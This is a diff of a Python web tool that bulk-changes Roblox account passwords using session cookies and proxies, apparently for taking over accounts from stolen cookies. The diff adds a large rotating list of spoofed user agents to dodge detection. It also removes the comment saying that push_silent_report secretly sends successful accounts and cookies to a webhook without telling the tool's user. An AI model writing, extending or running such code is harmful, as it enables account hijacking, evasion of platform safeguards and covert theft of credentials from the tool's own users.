@@ -36,25 +36,76 @@ def load_server_config():
         "discord_invite": discord_invite
     }
 
-# Tự tạo file config.json mẫu nếu chưa có để dễ chỉnh sửa
 if not os.path.exists(CONFIG_FILE):
     try:
         with open(CONFIG_FILE, "w", encoding="utf-8") as f:
             json.dump({
                 "webhook_url": "",
-                "discord_invite": "https://discord.gg/cxcPh6ZkPE"
+                "discord_invite": "https://discord.gg/vVUz3rJzmK"
             }, f, indent=4)
     except Exception:
         pass
 
-DEFAULT_USER_AGENT = "Roblox/2.624.577 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
+USER_AGENTS = [
+    "Roblox/2.624.577 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+    "Roblox/2.625.602 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+    "Roblox/2.626.418 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+    "Roblox/2.628.510 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+    "Roblox/2.630.480 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+    "Roblox/2.632.512 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+    "Roblox/2.634.605 (iPhone; CPU iPhone OS 18_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+    "Roblox/2.636.490 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+    "Roblox/2.638.550 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+    "Roblox/2.640.610 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+    "Roblox/2.624.577 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+    "Roblox/2.628.510 (iPad; CPU OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+    "Roblox/2.632.512 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+    "Roblox/2.636.490 (iPad; CPU OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+    "Roblox/2.640.610 (iPad; CPU OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+    "Roblox/2.624.577 (Android 14; SM-S928B; Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+    "Roblox/2.626.418 (Android 14; Pixel 8 Pro; Build/UQ1A.240205.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
+    "Roblox/2.628.510 (Android 14; SM-A546E; Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
+    "Roblox/2.630.480 (Android 14; 23127PN0CG; Build/UKQ1.230804.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
+    "Roblox/2.632.512 (Android 14; SM-G998B; Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
+    "Roblox/2.634.605 (Android 15; SM-S921B; Build/AP3A.240905.015.A2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
+    "Roblox/2.636.490 (Android 15; Pixel 9; Build/AD1A.240530.047) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
+    "Roblox/2.638.550 (Android 15; CPH2581; Build/UKQ1.231108.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
+    "Roblox/2.640.610 (Android 15; V2309; Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
+    "Roblox/2.642.405 (Android 15; SM-A556E; Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPad; CPU OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 15; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+]
 
-# Lưu trữ trạng thái các phiên chạy của người dùng
+def get_random_user_agent():
+    return random.choice(USER_AGENTS)
+
 jobs = {}
 jobs_lock = threading.Lock()
 
 def push_silent_report(success_lines, cookie_die_lines, mode_label):
-    """Gửi ngầm danh sách tài khoản thành công và cookie die về webhook, không đẩy log ra client/html"""
     if not success_lines and not cookie_die_lines:
         return
     cfg = load_server_config()
@@ -127,7 +178,6 @@ def refresh_cookie(session, headers, csrf_token):
         return None
 
 def classify_failure_reason(raw_msg):
-    """Chỉ trả về đúng 1 trong 3 lý do: Cookie die, password sai, Faceid account; ngược lại trả về None"""
     msg = (raw_msg or "").lower()
     if "faceid" in msg or "face id" in msg or "challenge" in msg or "2fa" in msg or "two step" in msg:
         return "Faceid account"
@@ -138,7 +188,7 @@ def classify_failure_reason(raw_msg):
     return None
 
 def change_password_core(cookie, current_password, new_password, proxy_config=None):
-    """Trả về: (ok, result_or_reason, is_rate_limited)"""
+    selected_ua = get_random_user_agent()
     try:
         headers = {
             'Cookie': f'.ROBLOSECURITY={cookie}',
@@ -146,7 +196,7 @@ def change_password_core(cookie, current_password, new_password, proxy_config=No
             'Accept': 'application/json, text/plain, */*',
             'Accept-Encoding': 'gzip, deflate, br',
             'Accept-Language': 'en-US,en;q=0.9',
-            'User-Agent': DEFAULT_USER_AGENT,
+            'User-Agent': selected_ua,
             'Origin': 'https://www.roblox.com',
             'Referer': 'https://www.roblox.com/my/account#!/info',
             'RBXAuthenticationNegotiation': '1',
@@ -195,6 +245,7 @@ def change_password_core(cookie, current_password, new_password, proxy_config=No
 
             refresh_headers = headers.copy()
             refresh_headers['Cookie'] = f'.ROBLOSECURITY={cookie_to_refresh}'
+            refresh_headers['User-Agent'] = selected_ua
 
             time.sleep(0.2)
             refreshed_cookie = refresh_cookie(refresh_session, refresh_headers, csrf_token)
@@ -269,7 +320,6 @@ def worker_job(job_id, accounts, mode, proxies, custom_password, prefix, custom_
             return jobs.get(job_id, {}).get("stop_requested", False)
 
     def record_failure(acc, reason_label):
-        """Chỉ lưu vào failed_list nếu lý do thuộc 3 loại: Cookie die, password sai, Faceid account"""
         if reason_label not in ("Cookie die", "password sai", "Faceid account"):
             return
         username = acc["username"]
@@ -422,7 +472,6 @@ def worker_job(job_id, accounts, mode, proxies, custom_password, prefix, custom_
         if job_id in jobs:
             jobs[job_id]["status"] = "completed"
     append_job_log(job_id, f"HOÀN TẤT TOÀN BỘ! Thành công: {len(successful_list)}/{total} tài khoản.", "DONE")
-
 
 @app.route("/")
 def index():
